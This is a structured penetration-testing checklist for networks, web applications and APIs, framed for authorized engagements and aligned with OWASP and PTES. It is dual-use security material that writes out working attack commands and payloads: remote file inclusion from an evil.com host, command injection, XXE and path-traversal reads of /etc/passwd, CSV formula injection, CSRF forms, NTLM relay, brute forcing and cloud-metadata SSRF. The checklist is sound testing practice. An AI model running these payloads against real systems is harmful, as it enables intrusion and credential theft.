# Network, Web Application & API Penetration Testing Checklist

> **Scope note:** For use only on systems you are explicitly authorized to test under a signed scope / rules of engagement (RoE). Replace `target.com` / `10.0.0.5` with your in-scope hosts.

# PART 1 — PRE-ENGAGEMENT & RECONNAISSANCE

## 1.1 Pre-Engagement Preparation
- [ ] Confirm written authorization / signed scope and RoE
- [ ] Define in-scope hosts, IP ranges, and explicitly out-of-scope systems
- [ ] Study the target's site/application structure before testing
- [ ] Prepare a test-case matrix covering every feature/page
- [ ] Agree on testing windows and emergency contact/stop procedure

## 1.2 Open-Source & Passive Recon
- [ ] Google dorking
  ```
  site:target.com filetype:pdf
  site:target.com inurl:admin
  site:target.com ext:sql | ext:env | ext:log
  ```
- [ ] Shodan / Censys search
  ```
  shodan search hostname:target.com
  ```
- [ ] Leaked credentials / breached email search (authorized breach-data tools only)
- [ ] Wayback Machine / historic URL discovery
  ```
  gau target.com
  waybackurls target.com
  ```
- [ ] GitHub / GitLab exposure search (leaked keys, internal repos)
  ```
  trufflehog github --repo=https://github.com/org/repo
  gitleaks detect --source . -v
  ```

## 1.3 Active Recon & Fingerprinting
- [ ] Identify web server and technology stack
  ```
  curl -I https://target.com
  whatweb target.com
  ```
- [ ] Subdomain enumeration
  ```
  subfinder -d target.com -o subs.txt
  amass enum -passive -d target.com
  ```
- [ ] Directory / content discovery
  ```
  ffuf -u https://target.com/FUZZ -w common.txt -mc 200,301,302,403
  gobuster dir -u https://target.com -w big.txt -x php,bak,old,zip
  dirsearch -u https://target.com -e php,html,js
  ```
- [ ] Identify WAF in front of the target
  ```
  wafw00f https://target.com
  ```
- [ ] Crawl entire site for sensitive keywords (password, token, secret, key, api)
- [ ] Test debug parameters (`?debug=true`, `?test=1`, `X-Debug` header)
- [ ] Identify all data entry points (forms, params, headers, cookies)
- [ ] Check metafiles: `/robots.txt`, `/sitemap.xml`, `/humans.txt`, `/security.txt`, `/crossdomain.xml`, `/clientaccesspolicy.xml`, `/phpinfo.php`
  ```
  curl https://target.com/robots.txt
  curl https://target.com/sitemap.xml
  curl https://target.com/crossdomain.xml
  ```
- [ ] Review HTML/JS source comments for developer notes
- [ ] Check for exposed `.git` / `.svn` / `.env` / backup files
  ```
  curl https://target.com/.git/config
  git-dumper https://target.com/.git/ ./dump
  curl https://target.com/.env
  ```
- [ ] Extract secrets/endpoints from JS bundles
  ```
  curl -s https://target.com/app.js | grep -Ei "key|secret|token|password"
  python3 linkfinder.py -i https://target.com/app.js -o cli
  ```
- [ ] Nmap / Netcat service enumeration, DNS and reverse-DNS lookups
  ```
  nmap -sV -sC -p80,443 target.com
  nc -nv target.com 80
  dig target.com
  dig -x <ip>
  ```

# PART 2 — NETWORK PENTESTING

## 2.1 Host & Port Discovery
- [ ] Ping sweep / live host discovery
  ```
  nmap -sn 10.0.0.0/24
  fping -a -g 10.0.0.0/24
  ```
- [ ] Full TCP port scan
  ```
  nmap -p- -T4 -Pn -oA fulltcp 10.0.0.5
  ```
- [ ] UDP scan / UDP service probing
  ```
  nmap -sU --top-ports 200 -Pn 10.0.0.5
  udp-proto-scanner.pl 10.0.0.5
  ```
- [ ] Service/version detection and OS fingerprinting
  ```
  nmap -sV -sC -O 10.0.0.5
  ```
- [ ] Banner grabbing
  ```
  nc -nv 10.0.0.5 21
  ```
- [ ] Large-range fast scanning
  ```
  masscan -p1-65535 10.0.0.0/16 --rate=10000
  ```
- [ ] Check ICMP packets allowed/blocked
  ```
  ping -c 4 10.0.0.5
  ```
- [ ] Identify services running on non-standard ports (not just 80/443)

## 2.2 Firewall / IDS Evasion
- [ ] ACK / fragmented packet scans
  ```
  nmap -sA 10.0.0.5
  nmap -f -T2 10.0.0.5
  ```
- [ ] Decoy scanning
  ```
  nmap -D RND:10 10.0.0.5
  ```
- [ ] VPN / IKE endpoint enumeration
  ```
  ike-scan 10.0.0.5
  ```

## 2.3 SMB / Windows Network
- [ ] SMB share/user/null-session enumeration
  ```
  smbclient -L //10.0.0.5 -N
  smbclient //10.0.0.5/IPC$ -N
  enum4linux -a 10.0.0.5
  nmap --script smb-enum-shares,smb-enum-users -p445 10.0.0.5
  ```
- [ ] SMB signing disabled / relay potential
  ```
  nmap --script smb-security-mode -p445 10.0.0.5
  responder -I eth0
  ntlmrelayx.py -tf targets.txt -smb2support
  ```
- [ ] Known SMB CVEs (EternalBlue etc.)
  ```
  nmap --script smb-vuln-ms17-010 -p445 10.0.0.5
  ```

## 2.4 Active Directory
- [ ] Domain/host enumeration & attack-path mapping
  ```
  crackmapexec smb 10.0.0.0/24
  bloodhound-python -u user -p pass -d domain.local -ns 10.0.0.5 -c all
  ```
- [ ] Kerberoasting / AS-REP Roasting
  ```
  GetUserSPNs.py domain.local/user:pass -dc-ip 10.0.0.5 -request
  GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.5
  ```
- [ ] Pass-the-hash
  ```
  crackmapexec smb 10.0.0.5 -u admin -H <NTLM_HASH>
  ```
- [ ] LDAP enumeration
  ```
  ldapsearch -x -H ldap://10.0.0.5 -b "dc=domain,dc=local"
  ```

## 2.5 DNS
- [ ] Zone transfer, brute force, cache snooping
  ```
  dig axfr @ns1.target.com target.com
  dnsenum target.com
  dnsrecon -d target.com -t brt
  dig @10.0.0.5 target.com A +norecurse
  ```
- [ ] DMARC / SPF policy check
  ```
  nslookup -type=txt target.com
  spoofcheck -d target.com
  ```
- [ ] Subdomain takeover check
  ```
  subjack -w subs.txt -t 50 -timeout 30 -o takeover.txt -ssl
  ```

## 2.6 SNMP
- [ ] Community string brute force / snmpwalk data dump
  ```
  onesixtyone -c community.txt 10.0.0.5
  snmpwalk -c public -v1 10.0.0.5
  ```

## 2.7 Legacy / Clear-Text Protocols
- [ ] Anonymous FTP login, Telnet cleartext check
  ```
  nmap --script ftp-anon -p21 10.0.0.5
  nmap --script telnet-encryption -p23 10.0.0.5
  ```

## 2.8 SSH
- [ ] Config audit, brute force, user enumeration
  ```
  ssh-audit 10.0.0.5
  hydra -L users.txt -P pass.txt ssh://10.0.0.5
  ```

## 2.9 TLS/SSL & Certificates
- [ ] Full cipher/protocol audit
  ```
  testssl.sh target.com:443
  sslscan target.com:443
  ```
- [ ] Heartbleed, POODLE, CCS injection
  ```
  nmap --script ssl-heartbleed,ssl-poodle,ssl-ccs-injection -p443 target.com
  ```
- [ ] Certificate validity, key length, signature algorithm
  ```
  openssl s_client -connect target.com:443 -servername target.com | openssl x509 -noout -text
  ```

## 2.10 MITM / Internal Network Attacks
- [ ] ARP spoofing (internal authorized segment only)
  ```
  ettercap -T -M arp:remote /10.0.0.1// /10.0.0.5//
  ```
- [ ] Packet capture / credential sniffing
  ```
  tcpdump -i eth0 -w capture.pcap
  ```
- [ ] LLMNR/NBT-NS poisoning, rogue DHCP
  ```
  responder -I eth0 -wrf
  ```

## 2.11 Databases & Other Exposed Services
- [ ] Database port exposure (MySQL/MSSQL/Postgres/Mongo/Redis)
  ```
  nmap -p1433,3306,5432,6379,27017 --script *-info 10.0.0.5
  redis-cli -h 10.0.0.5 ping
  ```
- [ ] VoIP / SIP enumeration
  ```
  svmap 10.0.0.0/24
  ```

## 2.12 Vulnerability & Exploit Mapping
- [ ] Automated CVE scan and known-exploit lookup
  ```
  nmap -sV --script vulners 10.0.0.5
  searchsploit <service name/version>
  ```

# PART 3 — WEB APPLICATION PENTESTING

## 3.1 User Registration
- [ ] Duplicate registration with the same identity
- [ ] Overwrite/takeover an existing user during registration
- [ ] Username uniqueness enforcement
- [ ] Weak password policy at signup
- [ ] Insufficient email verification process
- [ ] Disposable/throwaway email acceptance
- [ ] Fuzz post-registration for overwritten/created resources named after profile
- [ ] Submit only whitespace as password

## 3.2 Authentication
- [ ] Username enumeration via differing responses
  ```
  curl -X POST -d 'user=admin&pass=wrong' https://target.com/login
  curl -X POST -d 'user=notexist&pass=wrong' https://target.com/login
  ```
- [ ] Resilience to password guessing / brute force, lockout after 3–5 attempts
  ```
  hydra -L users.txt -P pass.txt target.com http-post-form "/login:u=^USER^&p=^PASS^:F=invalid"
  ```
- [ ] Account recovery function abuse
- [ ] "Remember me" token weaknesses (encryption, server-side storage)
- [ ] Impersonation / "login as user" function abuse
- [ ] Unsafe distribution of credentials (in URL, email in cleartext)
- [ ] Fail-open conditions (auth service down → access granted?)
- [ ] Multi-stage login flow logic flaws (skip steps, replay step 1)
- [ ] SQL injection on login form
  ```
  ' OR '1'='1'-- -
  sqlmap -u "https://target.com/login" --data="user=a&pass=b" --batch
  ```
- [ ] Autocomplete enabled on sensitive fields
- [ ] Missing password confirmation before changing email/password/2FA
- [ ] Login available over both HTTP and HTTPS — test weak HTTP path
- [ ] Build custom password wordlist from site content
  ```
  cewl https://target.com -w wordlist.txt
  ```
- [ ] OAuth login — test for open redirect in `redirect_uri`
  ```
  curl -I "https://target.com/oauth/callback?redirect_uri=https://evil.com"
  ```
- [ ] SAML response tampering (signature stripping, XML signature wrapping)
- [ ] OTP: guessable codes, brute force, race conditions
  ```
  ffuf -u https://target.com/verify -X POST -d 'otp=FUZZ' -w 0000-9999.txt -mc 200
  ```
- [ ] JWT common flaws: alg=none, weak secret, kid injection, missing signature check
  ```
  jwt_tool <token> -X a
  jwt_tool <token> -C -d rockyou.txt
  ```
- [ ] Browser cache weaknesses on auth pages (`Pragma`, `Expires`, `Cache-Control`)
  ```
  curl -I https://target.com/account | grep -i cache-control
  ```
- [ ] Default credentials, org-name-as-password, blank password

## 3.3 Session Management
- [ ] Session handling logic review
- [ ] Session token meaning/structure analysis (does it encode user data?)
- [ ] Token predictability (Burp Sequencer entropy analysis)
- [ ] Insecure transmission of tokens (over HTTP, in URL/GET)
- [ ] Token disclosure in server logs / Referer headers
- [ ] Mapping of tokens to sessions (can one token access multiple sessions?)
- [ ] Session termination on logout and password reset
- [ ] Session fixation
  ```
  curl -c cookies.txt https://target.com/login -d 'user=a&pass=b'
  ```
- [ ] CSRF — full token-bypass matrix
  ```html
  <form action="https://target.com/change-email" method="POST">
    <input name="email" value="attacker@evil.com">
  </form><script>document.forms[0].submit()</script>
  ```
  - [ ] Token not validated server-side
  - [ ] Partial-length token validation
  - [ ] Token reused across different accounts
  - [ ] Method swap POST→GET
  - [ ] Token parameter removed entirely
  - [ ] Token parameter blank
  - [ ] Old/unused token replayed
  - [ ] Token value replaced with attacker's own valid token
  - [ ] Content-Type switched to multipart/form-data
  - [ ] Token characters altered/truncated
  - [ ] Referer/Origin header changed or stripped
  - [ ] Host header manipulation
  - [ ] Combined with clickjacking
- [ ] Cookie scope (domain/path too broad)
- [ ] Decode cookies (Base64, hex, URL encoding) to inspect contents
- [ ] Cookie expiration time appropriateness
- [ ] `HttpOnly` and `Secure` flags present
  ```
  curl -I https://target.com | grep -i set-cookie
  ```
- [ ] Reuse same cookie from a different IP/system (session binding check)
- [ ] Access-control effectiveness across multiple test accounts
- [ ] Insecure access-control via request parameters or Referer header
- [ ] Concurrent login from different machine/IP allowed?

## 3.4 Profile / Account Management
- [ ] Tamper user-ID parameter to view/edit other users' details (IDOR)
  ```
  curl -H "Authorization: Bearer <token>" https://target.com/api/users/124
  ```
- [ ] CSRF on every account-only feature
- [ ] Change email to an existing user's email — check server-side validation
- [ ] Email-change confirmation link — behavior if never confirmed
- [ ] File upload: unrestricted type, no AV scan, no size limit, extension/MIME filter bypass
  ```
  curl -F "file=@shell.php.jpg" https://target.com/upload
  curl -F "file=@shell.php;type=image/jpeg" https://target.com/upload
  curl -F "file=@test.php%00.jpg" https://target.com/upload
  ```
- [ ] CSV import/export: formula/command injection, XSS, macro injection
  ```
  =cmd|'/c calc'!A1
  ```
- [ ] Profile picture URL/EXIF metadata leakage
  ```
  exiftool uploaded_image.jpg
  ```
- [ ] ImageTragick-style exploit in image upload pipeline
- [ ] Metadata review of all downloadable files
- [ ] Account deletion then reactivate via "Forgot password" flow
- [ ] Brute-force enumeration via any unique user parameter
- [ ] Re-authentication required for sensitive operations?
- [ ] Parameter pollution — submit two values for the same field
  ```
  curl "https://target.com/api/user?id=123&id=124"
  ```

## 3.5 Forgot / Reset Password
- [ ] Session invalidated on logout and on password reset
- [ ] Uniqueness of reset link/code
- [ ] Reset link/token expiration enforced
- [ ] User ID or sensitive fields embedded in reset link — tamper them
- [ ] Request two reset links, use the older one
- [ ] Check for sequential/predictable reset tokens across multiple requests

## 3.6 Input Handling / Injection
- [ ] Fuzz every request parameter; identify all reflected data points
- [ ] Reflected XSS — full filter-bypass matrix
  ```
  <script>alert(document.domain)</script>
  dalfox url "https://target.com/search?q=FUZZ"
  ```
  - [ ] Character escape sequences
  - [ ] `<`/`>` replaced with HTML entities, then bypass with alternate tags
  - [ ] Mixed-case payloads
  - [ ] CRLF (`\r\n`) to break WAF regex
  - [ ] Double URL encoding
  - [ ] Recursive-filter bypass (nested tags)
  - [ ] Anchor tags without whitespace
  - [ ] Whitespace replaced with bullet/comment characters
  - [ ] HTTP method change
- [ ] Stored XSS across profile, cart, upload filename, settings, comments/forum fields
  ```
  curl -F "file=@<script>alert(1)</script>.jpg" https://target.com/upload
  ```
- [ ] HTTP header injection (GET & POST), `X-Forwarded-Host` abuse
  ```
  curl -H "X-Forwarded-Host: evil.com" https://target.com/
  curl -H "Host: evil.com" https://target.com/forgot-password -d 'email=victim@target.com'
  ```
- [ ] Arbitrary/open redirect
  ```
  curl -I "https://target.com/redirect?url=https://evil.com"
  ```
- [ ] OS command injection
  ```
  curl "https://target.com/ping?host=127.0.0.1;id"
  commix --url="https://target.com/ping?host=127.0.0.1"
  ```
- [ ] Path traversal / local & remote file inclusion
  ```
  curl "https://target.com/page?file=../../../../etc/passwd%00"
  curl "https://target.com/page?file=http://evil.com/shell.txt"
  ```
- [ ] Script injection / server-side template injection
  ```
  {{7*7}}   ${7*7}   #{7*7}   <%= 7*7 %>
  tplmap -u "https://target.com/page?name=test"
  ```
- [ ] Native software flaws — buffer overflow, integer bugs, format strings
  ```
  %s%s%s%s%s   %x%x%x%x
  ```
- [ ] SOAP / XPath / LDAP injection
  ```
  ' or '1'='1
  *)(uid=*))(|(uid=*
  ```
- [ ] XXE — inject in any XML-capable request, including forced `Content-Type: text/xml`
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <foo>&xxe;</foo>
  ```
- [ ] SQL injection — GET/POST/Cookie/Header-based, blind, time-based, tamper scripts
  ```
  sqlmap -u "https://target.com/item?id=1" --batch --level=5 --risk=3
  sqlmap -u "https://target.com/item?id=1" --cookie="PHPSESSID=x" --batch
  sqlmap -u "https://target.com/item?id=1" --tamper=space2comment --batch
  ```
- [ ] NoSQL injection
  ```
  curl -X POST -d '{"user":{"$ne":null},"pass":{"$ne":null}}' https://target.com/login
  ```
- [ ] HTTP request smuggling
  ```
  smuggler.py -u https://target.com
  ```
- [ ] SSRF against previously discovered internal/open ports
  ```
  curl -X POST -d '{"url":"http://169.254.169.254/latest/meta-data/"}' https://target.com/fetch
  ```
- [ ] `xmlrpc.php` DoS and user-enumeration abuse
- [ ] Dangerous HTTP methods — OPTIONS, PUT, DELETE, TRACE
  ```
  curl -X OPTIONS -i https://target.com
  curl -X PUT -d "test" https://target.com/test.txt
  curl -X TRACE https://target.com
  ```

## 3.7 Error Handling
- [ ] Access fake custom pages (`/whatever_fake.php`, `.aspx`, `.html`)
- [ ] Add multiple duplicate parameters with differing values in GET/POST
- [ ] Inject `[]`, `]]`, `[[` into cookie/parameter values to force errors
- [ ] Append `/~randomthing/%s` to the URL to trigger errors
- [ ] Burp Intruder "fuzzing full" payload list against inputs to enumerate error codes
- [ ] Unusual HTTP verbs: `PATCH`, `DEBUG`, or invented verbs like `FAKE`

## 3.8 Application / Business Logic
- [ ] Map the full logic attack surface and all transaction flows
- [ ] Test reliance on client-side-only validation (resubmit with validation bypassed)
- [ ] Transmission of sensitive data/state via client (hidden fields, JS variables)
- [ ] Thick-client component flaws (Java applet, ActiveX, Flash remnants)
- [ ] Multi-stage process logic flaws — skip/replay/reorder steps
- [ ] Handling of incomplete or partial input
- [ ] Trust-boundary violations between client/server/third-party
- [ ] CAPTCHA present on email/contact forms to prevent flooding
- [ ] Tamper product ID, price, quantity in add/modify/delete/pay actions
  ```
  curl -X POST -d 'price=-100&qty=-1' https://target.com/cart/update
  ```
- [ ] Gift/discount code tampering, reuse, and parameter pollution for double redemption
- [ ] Stored XSS in loosely validated fields (address, notes, display name)
- [ ] CVV/card-number masking in payment forms; is payment processed in-app or by a PSP?
- [ ] IDOR on other users' tickets/cart/shipment/invoices
- [ ] IDOR via PDF/print generation endpoints
- [ ] Unsubscribe-link user enumeration
- [ ] Parameter pollution on social-sharing links
- [ ] CORS misconfiguration
  ```
  curl -H "Origin: https://evil.com" -I https://target.com/api/data
  ```
- [ ] Convert sensitive POST requests to GET and test enforcement
- [ ] Race conditions on single-use actions (coupon redemption, fund transfer)
  ```
  for i in {1..20}; do curl -X POST https://target.com/redeem -d 'code=PROMO1' & done; wait
  ```

## 3.9 Hosting & Infrastructure
- [ ] Segregation in shared hosting infrastructure
- [ ] Segregation between applications on the same app-server platform
- [ ] General web-server vulnerabilities and default pages
- [ ] Dangerous HTTP methods enabled server-wide
- [ ] Open proxy functionality
- [ ] Virtual-host / default vhost misconfiguration
  ```
  curl -H "Host: nonexistent.target.com" https://target.com
  ```
- [ ] Internal numeric IPs disclosed in responses
- [ ] External numeric IPs disclosed and resolved
- [ ] Cloud asset references (S3 buckets, blob storage, etc.)
  ```
  aws s3 ls s3://target-bucket --no-sign-request
  curl https://target-bucket.s3.amazonaws.com/
  ```

## 3.10 CAPTCHA
- [ ] Replay an old CAPTCHA value
- [ ] Replay old CAPTCHA value tied to an old session ID
- [ ] Request CAPTCHA image via direct absolute path
- [ ] Remove CAPTCHA via ad-blocker/DOM edit and resubmit
- [ ] Attempt OCR-based automated bypass

## 3.11 Security Headers
- [ ] `X-XSS-Protection`
- [ ] `Strict-Transport-Security`
- [ ] `Content-Security-Policy`
- [ ] `X-Frame-Options` / CSP `frame-ancestors`
- [ ] `X-Content-Type-Options`
- [ ] `Referrer-Policy`
- [ ] `Cache-Control` / `Expires` on sensitive responses
  ```
  curl -I https://target.com
  ```

## 3.12 Client-Side Security
- [ ] DOM-based XSS — identify sinks (`innerHTML`, `document.write`, `eval`) and craft payloads
- [ ] Clickjacking PoC
  ```html
  <iframe src="https://target.com/account" style="opacity:0.1"></iframe>
  ```
- [ ] Subresource Integrity (SRI) missing on third-party scripts
- [ ] Sensitive data stored in `localStorage`/`sessionStorage`

## 3.13 Cryptography & Transport
- [ ] Full TLS/SSL weakness sweep: DROWN, POODLE, BEAST, FREAK, NULL ciphers, RC4/NOMORE, LUCKY13, CRIME, LOGJAM
  ```
  testssl.sh target.com:443
  nmap --script ssl-poodle,ssl-heartbleed,ssl-ccs-injection -p443 target.com
  ```
- [ ] Certificate key length ≥2048 bits, signature algorithm SHA-256+, validity window
  ```
  openssl s_client -connect target.com:443 | openssl x509 -noout -text
  ```

## 3.14 Rate Limiting & Abuse Resistance
- [ ] Bypass via endpoint case change, trailing slash, duplicated/extra headers, `Origin` header, IP rotation via `X-Forwarded-For`, null bytes, race conditions
  ```
  for i in {1..50}; do curl -s -o /dev/null -w "%{http_code}\n" -X POST https://target.com/login -d 'user=admin&pass=wrong' & done; wait
  curl -H "X-Forwarded-For: 1.2.3.4" https://target.com/login -d 'user=a&pass=b'
  ```

## 3.15 Other Checks
- [ ] Broken outbound link / link-hijack scan
  ```
  blc https://target.com -ro
  ```
- [ ] Weak 2FA bypass vectors: session reuse, OAuth flaw, brute force, response/status-code manipulation, activation-link login, email/password change mid-flow, null entry, boolean flip, parameter removal
- [ ] EXIF/geodata stripped from uploaded images

# PART 4 — API PENTESTING (REST / GraphQL / SOAP)

## 4.1 Recon
- [ ] API spec discovery
  ```
  curl -s https://target.com/swagger.json
  curl -s https://target.com/openapi.yaml
  curl -s https://target.com/api-docs
  ```
- [ ] Hidden endpoint fuzzing / version enumeration
  ```
  ffuf -u https://api.target.com/FUZZ -w api-wordlist.txt -mc 200,401,403
  ffuf -u https://api.target.com/vFUZZ/users -w versions.txt
  ```
- [ ] GraphQL introspection
  ```
  curl -X POST -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name,fields{name}}}}"}' \
    https://api.target.com/graphql
  ```

## 4.2 Broken Object Level Authorization (BOLA / IDOR)
```
curl -H "Authorization: Bearer <user2_token>" https://api.target.com/users/123/orders
```
- [ ] Change object ID directly
- [ ] Add extension at end (`/users/124.json`)
- [ ] Wrap ID in array / JSON object
  ```
  curl -X POST -d '{"id":["124"]}' https://api.target.com/user
  curl -X POST -d '{"id":{"id":"124"}}' https://api.target.com/user
  ```
- [ ] JSON / HTTP parameter pollution on ID field
- [ ] Case changes, path traversal, or word substitution on the ID
- [ ] Switch HTTP method (GET→POST/PUT/PATCH) on the same object endpoint
- [ ] Test outdated/shadow API versions for the same object
  ```
  curl https://api.target.com/api/v1/users/124
  ```

## 4.3 Broken Authentication
- [ ] JWT alg=none, weak secret brute force, `kid` header injection
  ```
  jwt_tool <token> -X a
  jwt_tool <token> -C -d rockyou.txt
  ```
- [ ] Long-lived or non-expiring tokens
- [ ] API keys passed in URL (leaked via logs/proxies/history)
- [ ] Credential stuffing / brute force resilience
  ```
  hydra -L users.txt -P pass.txt target.com http-post-form "/api/login:user=^USER^&pass=^PASS^:F=invalid"
  ```

## 4.4 Broken Object Property Level Authorization (Mass Assignment / Excessive Data Exposure)
```
curl -X POST -d '{"username":"x","isAdmin":true}' https://api.target.com/register
curl -s https://api.target.com/user/1 -H "Authorization: Bearer <token>" | jq
```

## 4.5 Unrestricted Resource Consumption
```
curl -X GET "https://api.target.com/items?limit=999999999"
ffuf -u https://api.target.com/login -X POST -d 'user=admin&pass=FUZZ' -w pass.txt -t 100
```
- [ ] GraphQL nested-query / batching DoS
  ```json
  {"query":"{a:users{b:users{c:users{id}}}}"}
  ```

## 4.6 Broken Function Level Authorization (BFLA)
```
curl -X DELETE -H "Authorization: Bearer <low_priv_token>" https://api.target.com/admin/users/5
```

## 4.7 Unrestricted Access to Sensitive Business Flows
- [ ] Automated abuse of purchase/booking/transfer/voting flows absent CAPTCHA or rate limiting

## 4.8 Server-Side Request Forgery
```
curl -X POST -d '{"url":"http://169.254.169.254/latest/meta-data/"}' https://api.target.com/fetch
curl -X POST -d '{"webhook":"http://internal-service:8080/admin"}' https://api.target.com/webhooks
```

## 4.9 Security Misconfiguration
- [ ] CORS wildcard combined with `Access-Control-Allow-Credentials: true`
  ```
  curl -H "Origin: https://evil.com" -I https://api.target.com/data
  ```
- [ ] Verbose error messages / stack traces
- [ ] Missing security headers
- [ ] Default/sample API keys still active

## 4.10 Improper Inventory Management
- [ ] Shadow/deprecated API versions still live and unpatched
- [ ] Staging/test API endpoints exposed to the internet

## 4.11 Unsafe Consumption of Third-Party APIs
- [ ] Intercept and mutate third-party API responses via proxy; confirm the app trusts them blindly

## 4.12 Injection (API-Specific)
- [ ] SQLi via JSON/API parameters
  ```
  sqlmap -u "https://api.target.com/item?id=1" --headers="Authorization: Bearer <token>" --batch
  ```
- [ ] NoSQLi
  ```
  curl -X POST -d '{"user":{"$gt":""}}' https://api.target.com/login
  ```
- [ ] XXE on SOAP/XML API endpoints
- [ ] Command injection via parameters
  ```
  commix --url="https://api.target.com/ping" --data="host=127.0.0.1"
  ```
- [ ] GraphQL injection through query variables

## 4.13 Rate Limiting & Throttling
- [ ] Per-endpoint limit testing, IP/token rotation bypass
  ```
  for i in {1..100}; do curl -s -o /dev/null -w "%{http_code}\n" https://api.target.com/data -H "Authorization: Bearer <token>"; done
  curl -H "X-Forwarded-For: 1.2.3.4" https://api.target.com/login -d 'user=a&pass=b'
  ```

## 4.14 API Key / Secrets Management
- [ ] Keys exposed in client-side JS or public repos
  ```
  curl -s https://target.com/app.js | grep -Eo "(api[_-]?key|secret|token)[\"']?\s*[:=]\s*[\"'][a-zA-Z0-9_\-]{10,}"
  trufflehog github --repo=https://github.com/org/repo
  ```
- [ ] Key rotation / revocation — does an old key still work?

## 4.15 Input / Schema Validation
- [ ] Content-Type confusion
  ```
  curl -X POST -H "Content-Type: application/xml" -d '<xml>payload</xml>' https://api.target.com/data
  ```
- [ ] Parameter pollution, type juggling
  ```
  curl "https://api.target.com/data?id=1&id=2"
  curl -X POST -d '{"id":["1","2"]}' https://api.target.com/data
  ```
- [ ] Automated schema-based fuzzing
  ```
  schemathesis run https://target.com/openapi.json
  ```

## 4.16 Logging & Monitoring
- [ ] Confirm failed-auth attempts, admin actions, and high-volume abuse all generate audit logs/alerts (coordinate with blue team)

# PART 5 — TOOLING REFERENCE

| Category | Tools |
|---|---|
| Recon / Scanning | nmap, masscan, amass, subfinder, whatweb |
| Proxy / Manual Testing | Burp Suite, OWASP ZAP |
| Content Discovery | ffuf, gobuster, dirsearch |
| Historic URLs | gau, waybackurls |
| SQLi | sqlmap |
| XSS | dalfox, XSStrike |
| Command Injection | commix |
| SSTI | tplmap |
| JWT | jwt_tool |
| SSRF/XXE OOB testing | Burp Collaborator, interact.sh |
| GraphQL | InQL, graphql-cop |
| API Fuzzing | Postman, Schemathesis |
| Password Attacks | hydra, medusa |
| AD/Windows | crackmapexec, bloodhound, impacket suite |
| TLS/SSL | testssl.sh, sslscan |
| Secrets Scanning | trufflehog, gitleaks |
| Packet Capture | tcpdump, Wireshark |
| WAF Detection | wafw00f |
| CORS | corsy |
| Subdomain Takeover | subjack |
| Breach/Leak Lookup | pwndb-style breach tools |
| Wordlist Building | cewl |
| EXIF | exiftool |
| Broken Links | blc |
| HTTP Smuggling | smuggler |

# PART 6 — REPORTING CHECKLIST
- [ ] Executive summary (business risk, non-technical)
- [ ] Scope and methodology documented
- [ ] Each finding: description, affected endpoint/host, CVSS score, evidence (request/response, screenshots)
- [ ] Reproduction steps for every finding
- [ ] Remediation recommendations per finding
- [ ] Risk-prioritized findings table
- [ ] Re-test / verification results after fixes

---

*Methodology aligned with the OWASP Web Security Testing Guide, OWASP API Security Top 10, and PTES. Always operate within a signed scope / rules of engagement, and never test production systems without written authorization.*
